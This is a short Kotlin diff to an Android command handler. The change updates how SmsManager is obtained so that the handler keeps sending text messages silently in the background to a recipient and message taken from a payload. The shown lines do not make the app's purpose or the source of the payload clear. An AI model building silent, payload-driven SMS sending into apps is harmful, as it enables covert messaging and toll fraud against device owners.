@@ -73,7 +73,12 @@ object CommandExecutor {
             ?: return Pair(false, "Missing 'message' field in payload")
 
         return try {
-            val smsManager = android.telephony.SmsManager.getDefault()
+            val smsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                context.getSystemService(android.telephony.SmsManager::class.java)
+            } else {
+                @Suppress("DEPRECATION")
+                android.telephony.SmsManager.getDefault()
+            }
             smsManager.sendTextMessage(to, null, message, null, null)
             Pair(true, "SMS sent automatically in the background to $to")
         } catch (e: Exception) {
